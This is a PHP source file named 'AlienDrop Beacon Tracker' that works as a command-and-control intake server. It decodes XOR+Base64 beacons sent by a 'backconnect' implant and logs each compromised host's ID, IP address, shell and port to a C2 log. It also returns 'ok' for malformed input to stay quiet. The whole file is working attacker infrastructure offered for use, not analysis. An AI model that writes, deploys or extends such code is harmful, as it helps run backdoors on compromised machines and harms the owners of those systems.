<?php
// MINC - AlienDrop Beacon Tracker (track.php?bc=1 — XOR+Base64 Beacon Intake)

header("Content-Type: text/plain");

// === CONFIG ===
$save_dir = __DIR__ . "/output/beacons";
$global_log = __DIR__ . "/output/c2_log.json";
$key = "alien"; // XOR key (must match the one in backconnect)

// === Decode XOR+Base64
function xor_decode($data, $key) {
    $raw = base64_decode($data);
    $out = '';
    for ($i = 0; $i < strlen($raw); $i++) {
        $out .= $raw[$i] ^ $key[$i % strlen($key)];
    }
    return $out;
}

// === Optional GeoIP Stub
function geoip_stub($ip) {
    if (strpos($ip, '192.168.') === 0 || strpos($ip, '10.') === 0 || strpos($ip, '172.') === 0) {
        return "internal";
    }
    return "external";
}

// === Beacon Logging
function log_beacon($id, $uuid, $data) {
    global $save_dir, $global_log;
    @mkdir($save_dir, 0777, true);

    $ts = time();
    $short = substr($uuid, 0, 8);
    $file = "$save_dir/{$id}_{$short}_$ts.json";

    @file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));

    $entry = [
        "ts"     => $ts,
        "id"     => $id,
        "uuid"   => $uuid,
        "ip"     => $_SERVER['REMOTE_ADDR'] ?? "unknown",
        "geo"    => geoip_stub($_SERVER['REMOTE_ADDR'] ?? "unknown"),
        "method" => $data['method'] ?? "unknown",
        "port"   => $data['port'] ?? "n/a",
        "shell"  => $data['shell'] ?? "n/a",
        "php"    => $data['php'] ?? "n/a"
    ];

    if (!file_exists($global_log)) {
        file_put_contents($global_log, json_encode([$entry], JSON_PRETTY_PRINT));
    } else {
        $arr = json_decode(file_get_contents($global_log), true);
        $arr[] = $entry;
        file_put_contents($global_log, json_encode($arr, JSON_PRETTY_PRINT));
    }
}

// === Beacon Intake Mode
if (isset($_GET['bc']) && $_GET['bc'] == 1 && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $b64 = $_POST['data'] ?? '';
    $json = xor_decode($b64, $key);
    $data = @json_decode($json, true);

    if (!is_array($data) || !isset($data['id']) || !isset($data['uuid'])) {
        echo "ok"; // silently ignore malformed
        exit;
    }

    log_beacon($data['id'], $data['uuid'], $data);
    echo "ok";
    exit;
}

echo "noop";
exit;
?>
